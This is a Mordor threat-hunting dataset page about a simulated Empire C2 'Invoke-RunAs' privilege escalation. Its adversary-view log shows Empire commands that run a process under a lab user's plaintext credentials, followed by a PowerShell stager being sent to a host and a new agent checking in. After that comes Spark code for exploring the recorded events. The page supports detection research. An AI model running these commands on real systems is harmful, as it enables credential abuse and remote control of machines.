# Empire Invoke Runas

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518204300 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/hunters-forge/mordor/blob/master/large_datasets/apt3/environment/empire/scripts/invoke-runas-cmd.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/privilege_escalation/empire_invoke_runas.tar.gz |

## Dataset Description
This dataset represents adversaries creating processes with explicit credentials (runas style).

## Adversary View
```
(Empire: TKV35P8X) > scriptimport /tmp/invoke-runas-cmd.ps1
[*] Tasked TKV35P8X to run TASK_SCRIPT_IMPORT
[*] Agent TKV35P8X tasked with task ID 22
script successfully saved in memory

(Empire: TKV35P8X) > scriptcmd Invoke-RunAs -username pgustavo -password "W1n1!19" -domain shire -Cmd cmd.exe -Arguments "/c C:\windows\system32\autoupdate.vbs"

[*] Tasked TKV35P8X to run TASK_SCRIPT_COMMAND
[*] Agent TKV35P8X tasked with task ID 23
(Empire: TKV35P8X) > Job started: G16X7P

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                   
-------  ------    -----      -----     ------     --  -- -----------                                                   
    18       4     1528       1200       0.00   6732   1 cmd                                                           


[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent V6W3TH8Y checked in
[+] Initial agent V6W3TH8Y from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to V6W3TH8Y at 10.0.10.103

(Empire: TKV35P8X) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 20:43:55  https           
TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 20:43:51  https           
EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 20:43:54  https           

V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 20:43:52  https           

(Empire: agents) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/privilege_escalation/empire_invoke_runas.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        